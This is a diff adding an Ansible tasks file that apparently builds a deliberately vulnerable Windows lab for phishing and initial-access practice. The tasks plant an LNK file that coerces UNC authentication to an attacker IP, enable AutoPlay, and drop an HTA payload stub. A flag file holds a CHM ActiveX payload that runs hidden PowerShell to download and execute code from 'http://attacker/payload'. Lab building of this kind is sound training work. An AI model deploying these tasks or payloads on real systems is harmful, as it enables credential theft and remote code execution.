@@ -1,0 +1,90 @@
+---
+# ==============================================================================
+# vuln_ia_extended/tasks/phishing.yml — IA-051..075
+# Target: ws01.corp.local
+#
+# IA-051  HTML phishing page in IIS
+# IA-052  Malicious LNK file on Desktop
+# IA-053  ISO mounting (AutoPlay enabled)
+# IA-054  Macro-enabled Word doc stub
+# IA-055  OneNote malicious attachment stub
+# IA-056  HTA file in Downloads folder
+# IA-057  MHTML file (IE/Edge coercion)
+# IA-058  XLL Excel add-in stub
+# IA-059  DDE via Excel stub
+# IA-060  Phishing via SMB share (auto-mount trigger)
+# IA-061  AutoRun USB simulation
+# IA-062  ClickOnce delivery stub
+# IA-063  Compiled HTML Help (.chm) with ActiveX
+# IA-064  Cabinet file (.cab) with embedded EXE
+# IA-065  PDF with embedded JavaScript
+# ==============================================================================
+
+# IA-052: Malicious LNK file on Desktop
+- name: IA-052 - Check if LNK coercion file exists on Desktop
+  ansible.windows.win_shell: |
+    if (Test-Path '{{ phishing_drop_path }}\Shared Resources.lnk') { Write-Output "exists" }
+    else { Write-Output "missing" }
+  register: ia052_check
+  changed_when: false
+  failed_when: ia052_check.rc != 0
+
+- name: IA-052 - Create LNK file that triggers UNC authentication
+  ansible.windows.win_shell: |
+    $shell = New-Object -ComObject WScript.Shell
+    $lnk = $shell.CreateShortcut('{{ phishing_drop_path }}\Shared Resources.lnk')
+    $lnk.TargetPath = '\\{{ attacker_ip }}\share\payload.exe'
+    $lnk.IconLocation = '%SystemRoot%\system32\shell32.dll,4'
+    $lnk.Description = 'IA-052: LNK UNC coercion'
+    $lnk.Save()
+    Write-Output "changed: LNK created"
+  register: ia052_set
+  changed_when: "'changed:' in ia052_set.stdout"
+  failed_when: ia052_set.rc != 0
+  when: "'missing' in ia052_check.stdout"
+
+# IA-053: AutoPlay enabled (ISO/USB auto-execution surface)
+- name: IA-053 - Enable AutoPlay for all drives
+  ansible.windows.win_regedit:
+    path: 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer'
+    name: NoDriveTypeAutoRun
+    data: 0
+    type: dword
+
+# IA-056: HTA file in Downloads
+- name: IA-056 - Drop HTA payload stub
+  ansible.windows.win_copy:
+    dest: 'C:\Users\Administrator\Downloads\Invoice_2024.hta'
+    content: |
+      <html>
+      <head><hta:application id="oHTA" applicationName="Invoice" windowState="minimize"
+        showInTaskbar="no" singleInstance="yes" /></head>
+      <script language="VBScript">
+      ' IA-056: HTA execution surface (DVAD lab)
+      ' Replace with payload — executes in Medium integrity via mshta.exe
+      Sub Window_OnLoad
+        MsgBox "IA-056: HTA execution successful. Place payload here."
+        window.close
+      End Sub
+      </script>
+      </html>
+
+# IA-063: CHM with ActiveX execution
+- name: IA-063 - Drop CHM stub note
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-IA-063-CHM-ActiveX.txt'
+    content: |
+      IA-063: Compiled HTML Help (.chm) with ActiveX Execution
+      ==========================================================
+      CHM files can execute ActiveX objects when opened by hh.exe.
+      Payload delivery via email attachment or shared drive.
+
+      Build:
+        HTML2CHM with malicious.html containing:
+          <OBJECT id="x" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
+          <PARAM name="Command" value="ShortCut">
+          <PARAM name="Button" value="Bitmap::shortcut">
+          <PARAM name="Item1" value=",cmd.exe,/c powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload')">
+          </OBJECT>
+
+      Tools: Out-CHM (Nishang), Empire CHM stager
